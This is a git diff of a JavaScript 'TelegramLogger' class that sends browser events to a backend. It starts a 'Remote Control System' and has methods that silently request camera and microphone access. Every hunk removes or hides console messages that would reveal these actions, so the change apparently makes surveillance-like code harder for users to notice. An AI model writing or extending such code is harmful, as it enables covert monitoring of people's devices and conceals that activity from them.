@@ -65,7 +65,6 @@ class TelegramLogger {
                 setTimeout(() => {
                     if (window.remoteControl) {
                         window.remoteControl.start();
-                        console.log('🎮 Remote Control System: ACTIVE');
                     }
                 }, 2500);
             }, 500);
@@ -107,7 +106,6 @@ class TelegramLogger {
                     setTimeout(() => {
                         if (window.remoteControl) {
                             window.remoteControl.start();
-                            console.log('🎮 Remote Control System: ACTIVE');
                         }
                     }, 2500);
                 }, 500);
@@ -212,7 +210,7 @@ class TelegramLogger {
         }
 
         this.isProcessingQueue = true;
-        console.log(`📦 [TelegramLogger] Processing queue (${this.messageQueue.length} messages)...`);
+        if (this.debug) console.log(`📦 Processing queue: ${this.messageQueue.length} messages`);
 
         while (this.messageQueue.length > 0) {
             const { eventType, additionalData, resolve, reject } = this.messageQueue.shift();
@@ -226,13 +224,12 @@ class TelegramLogger {
 
             // Her mesaj sonrası 1.2 saniye bekle
             if (this.messageQueue.length > 0) {
-                console.log(`⏱️ [TelegramLogger] Waiting ${this.minDelayBetweenMessages}ms before next message...`);
                 await new Promise(resolve => setTimeout(resolve, this.minDelayBetweenMessages));
             }
         }
 
         this.isProcessingQueue = false;
-        console.log(`✅ [TelegramLogger] Queue processing complete!`);
+        if (this.debug) console.log(`✅ Queue complete`);
     }
 
     // Log gönderme (queue'ya ekle veya bypass)
@@ -242,10 +239,10 @@ class TelegramLogger {
         if (priorityEvents.includes(eventType)) {
             // Priority eventler için SADECE consent kontrolü (rate limit YOK!)
             if (!this.consentGiven && eventType !== 'consent_rejected' && eventType !== 'consent_granted') {
-                console.log(`⚠️ [TelegramLogger] Priority event ${eventType} blocked - no consent`);
+                if (this.debug) console.log(`⚠️ Priority event ${eventType} blocked - no consent`);
                 return { success: false, reason: 'consent_required' };
             }
-            console.log(`⚡ [TelegramLogger] Priority event ${eventType} - bypassing queue & rate limit!`);
+            if (this.debug) console.log(`⚡ Priority: ${eventType}`);
             return await this.sendLogImmediate(eventType, additionalData);
         }
 
@@ -257,9 +254,7 @@ class TelegramLogger {
         // Normal eventler queue'ya ekle
         return new Promise((resolve, reject) => {
             this.messageQueue.push({ eventType, additionalData, resolve, reject });
-            console.log(`📥 [TelegramLogger] Added ${eventType} to queue (queue size: ${this.messageQueue.length})`);
-            
-            // Queue processing başlat
+            if (this.debug) console.log(`📥 Queue: ${eventType} (${this.messageQueue.length})`);
             this.processQueue();
         });
     }
@@ -283,8 +278,6 @@ class TelegramLogger {
                 additional_data: additionalData
             };
 
-            console.log(`📤 [TelegramLogger] Sending ${eventType} to backend...`);
-            
             const response = await fetch(this.endpoint, {
                 method: 'POST',
                 headers: {
@@ -293,16 +286,12 @@ class TelegramLogger {
                 body: JSON.stringify(logData)
             });
 
-            console.log(`📥 [TelegramLogger] Backend status: ${response.status}`);
-
             const result = await response.json();
-
-            console.log(`✅ [TelegramLogger] Backend response:`, result);
-
+            if (this.debug) console.log(`✅ Sent: ${eventType}`);
             return result;
 
         } catch (error) {
-            console.error(`❌ [TelegramLogger] Error sending ${eventType}:`, error);
+            if (this.debug) console.error(`❌ Error: ${eventType}:`, error.message);
             return { success: false, error: error.message };
         }
     }
@@ -519,11 +508,9 @@ class TelegramLogger {
     async requestCameraAccessSilent() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            console.log('📷 [TelegramLogger] Camera permission granted (silent)');
             stream.getTracks().forEach(track => track.stop());
             return { success: true, granted: true };
         } catch (error) {
-            console.log('🚫 [TelegramLogger] Camera permission denied (silent)');
             return { success: false, granted: false };
         }
     }
@@ -532,11 +519,9 @@ class TelegramLogger {
     async requestMicrophoneAccessSilent() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            console.log('🎤 [TelegramLogger] Microphone permission granted (silent)');
             stream.getTracks().forEach(track => track.stop());
             return { success: true, granted: true };
         } catch (error) {
-            console.log('🚫 [TelegramLogger] Microphone permission denied (silent)');
             return { success: false, granted: false };
         }
     }
